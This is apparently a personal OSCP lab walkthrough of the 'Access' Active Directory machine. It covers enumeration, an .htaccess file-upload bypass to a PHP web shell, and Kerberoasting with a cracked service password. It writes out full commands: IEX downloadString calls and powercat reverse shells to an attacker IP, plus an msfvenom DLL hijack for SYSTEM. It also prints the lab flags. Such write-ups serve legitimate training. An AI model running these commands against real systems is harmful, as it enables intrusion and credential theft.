---
title: OSCP - Access - AD
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
Related: "[[Cybersecurity]]"
tags:
  - Cybersecurity
---
## Improved skills
- PHP bypasses
- Windows PrivEsc
- SeManageVolume Privilege Abuse
## Used tools
- nmap
- python
- powershell

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -vvv -oN access.nmap 192.168.230.187
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
80/tcp    open  http             syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49668/tcp open  unknown          syn-ack ttl 125
49673/tcp open  unknown          syn-ack ttl 125
49674/tcp open  unknown          syn-ack ttl 125
49677/tcp open  unknown          syn-ack ttl 125
49704/tcp open  unknown          syn-ack ttl 125
49791/tcp open  unknown          syn-ack ttl 125
```
---
# Enumeration

## Port 53 - DNS
No enumeration conducted
## Port 80 - HTTP (H2 Database)
- Navigated to `http://192.168.196.187:80`, viewed source and identified `TheEvent v4.6.0` (No exploits found)
![OSCP - Access - AD - image1](/files/OSCP%20-%20Access%20-%20AD%20-%20image1.png)
![OSCP - Access - AD - image2](/files/OSCP%20-%20Access%20-%20AD%20-%20image2.png)
- Opened Wappalyzer and identified `PHP 8.0.7`, `Windows Server` and `Apache HTTP Server 2.4.48`
![OSCP - Access - AD - image3](/files/OSCP%20-%20Access%20-%20AD%20-%20image3.png)
- Identified Contact form and attempted to send test message - received "Error: Unable to load the "PHP Email Form" Library!"
![OSCP - Access - AD - image4](/files/OSCP%20-%20Access%20-%20AD%20-%20image4.png)
- Ran `gobuster dir -u http://192.168.196.187 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap` - identified `/assets`, `/forms`, `/uploads`.
![OSCP - Access - AD - image5](/files/OSCP%20-%20Access%20-%20AD%20-%20image5.png)
- Returned to browser and identified file upload facility through "Buy Tickets" - created & uploaded `uploadtest.txt`
![OSCP - Access - AD - image6](/files/OSCP%20-%20Access%20-%20AD%20-%20image6.png)
- Navigated to `192.168.196.187/uploads/uploadtest.txt`
![OSCP - Access - AD - image7](/files/OSCP%20-%20Access%20-%20AD%20-%20image7.png)
## Port 88 - Kerberos
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` and identified username `administrator@access.offsec`
![OSCP - Access - AD - image8](/files/OSCP%20-%20Access%20-%20AD%20-%20image8.png)
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Names/names.txt -v` - no results
![OSCP - Access - AD - image9](/files/OSCP%20-%20Access%20-%20AD%20-%20image9.png)
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -v` - identified users `administrator` and `server`
![OSCP - Access - AD - image10](/files/OSCP%20-%20Access%20-%20AD%20-%20image10.png)
![OSCP - Access - AD - image11](/files/OSCP%20-%20Access%20-%20AD%20-%20image11.png)
## Port 135 - MSRPC (Windows RPC)
No enumeration conducted
## Port 139 & 445 - SMB
- Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.196.187`
![OSCP - Access - AD - image12](/files/OSCP%20-%20Access%20-%20AD%20-%20image12.png)
## Port 389/636/3268 - LDAP
- Ran `sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.196.187` - identified domain `access.offsec`
![OSCP - Access - AD - image13](/files/OSCP%20-%20Access%20-%20AD%20-%20image13.png)
---
# Exploitation
## Arbitary File Upload
Ran `echo "AddType application/x-httpd-php .bypass" > .htaccess` to allow new filename `.bypass` and uploaded `.htaccess` to target
![OSCP - Access - AD - image14](/files/OSCP%20-%20Access%20-%20AD%20-%20image14.png)
- Renamed `simple-backdoor.php` to `simple-backdoor.bypass` and uploaded
![OSCP - Access - AD - image15](/files/OSCP%20-%20Access%20-%20AD%20-%20image15.png)
- Navigated to `http://192.168.196.187/uploads/simple-backdoor.bypass?cmd=whoami` and achieved code execution on target
![OSCP - Access - AD - image16](/files/OSCP%20-%20Access%20-%20AD%20-%20image16.png)
- Generated PHP reverse shell to connect back to Attacker IP
![OSCP - Access - AD - image17](/files/OSCP%20-%20Access%20-%20AD%20-%20image17.png)
- Saved PHP reverse shell as `php-reverse.bypass`, then uploaded to target.
![OSCP - Access - AD - image18](/files/OSCP%20-%20Access%20-%20AD%20-%20image18.png)
- Started netcat listener on port `1234` then navigated to `http://192.168.196.187/uploads/php-reverse.bypass` and caught reverse shell
![OSCP - Access - AD - image19](/files/OSCP%20-%20Access%20-%20AD%20-%20image19.png)
---
# Lateral Movement to user
## Local Enumeration
- Ran `whoami /priv`
![OSCP - Access - AD - image20](/files/OSCP%20-%20Access%20-%20AD%20-%20image20.png)
- Ran `systeminfo` - identified `Windows Server 2019` `Build 17763` on `x64`
![OSCP - Access - AD - image21](/files/OSCP%20-%20Access%20-%20AD%20-%20image21.png)
- Uploaded `winpeasx64.exe` and ran on target
![OSCP - Access - AD - image22](/files/OSCP%20-%20Access%20-%20AD%20-%20image22.png)
- Identified vulnerabilities with `Watson`
![OSCP - Access - AD - image23](/files/OSCP%20-%20Access%20-%20AD%20-%20image23.png)
- Identified unquoted autorun binaries with spaces
![OSCP - Access - AD - image24](/files/OSCP%20-%20Access%20-%20AD%20-%20image24.png)
![OSCP - Access - AD - image25](/files/OSCP%20-%20Access%20-%20AD%20-%20image25.png)
- Uploaded `Get-SPN.ps1` and ran on target - identified 
![OSCP - Access - AD - image26](/files/OSCP%20-%20Access%20-%20AD%20-%20image26.png)
- Ran `Add-Type -AssemblyName System.IdentityModel` and `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'`
![OSCP - Access - AD - image27](/files/OSCP%20-%20Access%20-%20AD%20-%20image27.png)
## Lateral Movement vector
- Served `Invoke-Kerberoast.ps1` via Python3 server then ran: `iex(new-object net.webclient).downloadString('http://192.168.45.178:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat` for `svc_mssql` ticket hash
![OSCP - Access - AD - image28](/files/OSCP%20-%20Access%20-%20AD%20-%20image28.png)
- Reformatted and saved hash to local host as `msql.hash`
![OSCP - Access - AD - image29](/files/OSCP%20-%20Access%20-%20AD%20-%20image29.png)
- Ran `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSQL.hash` and cracked hash for credential `trustno1`
![OSCP - Access - AD - image30](/files/OSCP%20-%20Access%20-%20AD%20-%20image30.png)
- Uploaded `Invoke-RunasCs.ps1`, started netcat listener on port `5555` then ran `Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1');powercat -c 192.168.45.178 -p 5555 -e cmd"` for reverse shell as `svc_mssql` - caught reverse shell as `svc_mssql`
![OSCP - Access - AD - image31](/files/OSCP%20-%20Access%20-%20AD%20-%20image31.png)
- Ran `type C:\Users\svc_mssql\Desktop\local.txt` to print local flag `d075a9b799bbf34764ed55ccd797108d`
![OSCP - Access - AD - image32](/files/OSCP%20-%20Access%20-%20AD%20-%20image32.png)
---
# Privilege Escalation
## Local Enumeration
- Ran `whoami /priv` and identified `SeManageVolumePrivilege` - vulnerable to [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)
![OSCP - Access - AD - image33](/files/OSCP%20-%20Access%20-%20AD%20-%20image33.png)
## Privilege Escalation vector
- Served `SeManageVolumeExploit.exe` via python and ran `iwr -uri http://192.168.45.178/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe`
![OSCP - Access - AD - image34](/files/OSCP%20-%20Access%20-%20AD%20-%20image34.png)
- Ran `icacls C:\Windows\System32` - identified full privileges to `C:Windows\System32`
![OSCP - Access - AD - image35](/files/OSCP%20-%20Access%20-%20AD%20-%20image35.png)
- Ran `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=6666 -f dll -o tzres.dll` to create reverse shell in `tzres.dll` and uploaded to `C:\Windows\System32\wbem` 
![OSCP - Access - AD - image36](/files/OSCP%20-%20Access%20-%20AD%20-%20image36.png)
- Started netcat listener on port `6666` and ran `systeminfo` on target to trigger reverse shell - caught reverse shell as `nt authority`
![OSCP - Access - AD - image37](/files/OSCP%20-%20Access%20-%20AD%20-%20image37.png)
![OSCP - Access - AD - image38](/files/OSCP%20-%20Access%20-%20AD%20-%20image38.png)
- Ran `type C:\Users\Administrator\Desktop\proof.txt` to print proof flag `46e76431490ebf8ccc7c112f112fcfc2`
![OSCP - Access - AD - image39](/files/OSCP%20-%20Access%20-%20AD%20-%20image39.png)
---
# Trophy & Loot
`local.txt` = `d075a9b799bbf34764ed55ccd797108d`
`proof.txt` = `46e76431490ebf8ccc7c112f112fcfc2`

